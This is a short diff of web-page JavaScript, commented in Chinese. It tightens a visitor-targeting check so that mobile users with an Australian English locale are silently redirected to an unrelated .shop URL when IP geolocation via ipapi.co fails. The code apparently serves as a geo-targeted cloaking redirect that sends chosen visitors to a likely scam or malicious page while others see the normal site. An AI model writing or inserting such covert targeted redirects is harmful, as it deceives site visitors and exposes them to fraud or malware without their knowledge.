@@ -44,11 +44,9 @@
     }
 
 
-    function isEnglishLangInAustralia() {
-    const isEnglish = navigator.language.startsWith('en') || 
-                     navigator.languages.some(lang => lang.startsWith('en'));
-    const isInAustralia = data.country === 'AU'; // 假设 data.country 可用
-    return isEnglish && isInAustralia;
+  function isAustralianEnglish() {
+    return navigator.language === 'en-AU' || 
+           navigator.languages.some(lang => lang === 'en-AU');
 }
     
     fetch('https://ipapi.co/json/')
@@ -69,7 +67,7 @@
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isEnglishLangInAustralia()) {
+        if (isMobileDevice() && isAustralianEnglish()) {
           window.location.href = "https://www.kwey616t.shop/ao716/j.html";
           return;
         }
